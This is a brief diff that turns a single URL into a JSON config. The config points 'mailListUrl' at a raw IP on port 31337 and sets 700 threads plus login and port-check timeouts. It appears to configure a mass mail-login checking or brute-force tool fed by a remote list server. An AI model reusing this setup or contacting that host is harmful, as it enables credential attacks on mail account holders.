@@ -1,1 +1,8 @@
-http://194.9.6.26:31337/afaz/get.php
+{
+  "mailListUrl":"http://194.9.6.26:31337/afaz/get.php",
+  "threads":700,
+  "timeoutPortcheck": 5,
+  "timeoutLogin": 10,
+  "iterationDelay":200,
+  "checkUsername": false
+}
